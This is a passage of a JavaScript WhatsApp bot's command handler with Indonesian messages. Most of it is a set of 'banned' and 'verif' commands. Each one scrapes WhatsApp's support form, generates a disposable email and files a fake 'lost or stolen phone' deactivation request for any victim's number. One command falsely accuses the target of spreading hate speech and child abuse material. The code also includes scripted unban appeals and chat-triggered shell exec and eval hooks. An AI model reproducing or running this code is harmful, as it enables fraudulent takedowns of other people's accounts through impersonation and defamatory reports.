`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "out": case "verif":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv1": case "kenon":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv6": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv1": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "linkgc": case "linkgroup":{
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
const url = await Biiofc.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
reply(asu)
}
break
case "hidetag": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!q) return reply(`Teks?`)
global.hit = q
Biiofc.sendMessage(from, { text : global.hit ? global.hit : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case "add": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeKayla) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "kick": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "promote": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "demote": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biipfc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "antilink":{
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] == 'on') {
if (antilink) return reply('*Sudah Aktif!*')
antilink = true
reply('*Berhasil Mengaktifkan Antilink*')
} else if (args[0] == 'off') {
if (!antilink) return reply('*Belum Aktif!*')
antilink = false
reply('*Berhasil Mematikan Antilink*')
} else {
reply(`Command Salah Silahkan Gunakan Command Seperti Ini ${prefix}antilink on/off\n${prefix}antilink on = Untuk Menyalakan\n${prefix}antilink off = Untuk Mematikan`)
}
}
break
default:
}
if (budy.startsWith('$')) {
if (!isOwner) return reply(`CIEE MAU COLONG SC OWNER GW ANJ!! OTW BOT SPAM BUG😎`)
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
Biiofc.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})